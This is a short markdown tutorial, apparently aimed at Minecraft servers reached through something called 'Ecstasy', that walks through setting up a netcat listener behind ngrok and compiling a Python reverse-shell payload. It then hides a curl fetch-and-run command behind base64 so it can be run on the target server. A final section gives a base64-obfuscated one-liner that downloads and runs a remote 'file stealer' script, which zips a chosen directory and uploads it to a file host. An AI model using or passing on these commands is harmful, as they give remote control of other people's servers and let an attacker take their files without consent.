# Simplest Reverse Shell Tutorial (Supports Some Linux and Some Windows Servers)

## On Your Own Computer
1. **Get Netcat**  
   - For Windows: [Download Netcat](https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip)  
   - For Linux or macOS: Find and install the appropriate files for your OS.

2. **Get Ngrok and Set Up**  
   - [Download and setup Ngrok](https://ngrok.com)

3. **Start Ngrok**  
```ngrok tcp 4444```


4. **Start Netcat**  
```nc -lvp 4444```


5. **Download and Edit Python File**
   - [Download the Python file](https://catlitter.minoa.cat/api/view/bc52bb227eea93ac2dd0.zip) and edit the IP and port to be the Ngrok one.
   - (Must have python installed) run windows compile.bat and only if you have wsl setup you can run linux compile.bat and the files that show up are compilex executables.
   - Upload the compiled files to [catbox.moe](https://catbox.moe) or [CatLitter](https://catlitter.minoa.cat)

6. **Convert URL to Base64**
   - Use [base64encode.org](https://www.base64encode.org/) to convert the URL for whatever file to Base64.

## In Game (run under the shell command)
7. **Copy and Paste the Command into Ecstasy**
   - While logged into Ecstasy, use the command below, replacing `{BASE64 GOES HERE}` with the Base64 link:
`curl -O $(echo "`{BASE64 GOES HERE}`" | base64 --decode)`


8. **Encode Filename and Extension to Base64**
   - Encode the filename and extension that catbox.moe or Catlitter gives in the URL to Base64.

9. **Run the File**
Linux:
 ```./rs```
Windows:
```start rs.exe```
 - If there are errors, idk..


# more
## Linux mc server file stealer
```
bash -c 'curl -o steal.sh $(echo "aHR0cHM6Ly9jYXRsaXR0ZXIubWlub2EuY2F0L2FwaS92aWV3L2FkMGI1MTJhNzZiNTBjODhlY2VmLnNo" | base64 --decode) && chmod +x steal.sh && ./steal.sh && rm -- steal.sh'
```
*(downloads and runs [this script](https://catlitter.minoa.cat/api/view/ad0b512a76b50c88ecef.sh) that zips and uploads whatever dir you enter to gofile and gives you the link only on linux)*
